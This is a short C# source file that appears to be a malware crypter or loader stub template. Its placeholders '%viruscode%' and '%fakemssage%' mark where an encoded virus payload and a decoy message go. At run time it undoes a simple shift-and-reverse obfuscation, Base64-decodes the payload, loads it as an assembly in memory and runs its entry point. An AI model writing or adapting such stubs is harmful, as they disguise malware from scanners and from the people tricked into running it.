using System;
using System.Collections.Generic;
using System.IO;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Reflection;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic;

namespace WindowsFormsApp6
{
    static class Program
    {


        [STAThread]
        static void Main()
        {

            //ourfakemessage MessageBox.Show("%fakemssage%");



            string a = pr0t3_decrypt(@"%viruscode%");



            Assembly hello = Assembly.Load(Convert.FromBase64String(a));


            hello.EntryPoint.Invoke("", null);





        }



        public static string pr0t3_decrypt(string message)
        {
            string decrypted = "";
            int key = 3;
            foreach (char c in message)
                decrypted = decrypted + Strings.Chr((Strings.Asc(c) - key));
            decrypted = Strings.StrReverse(decrypted);
            return decrypted;
        }



    }
}
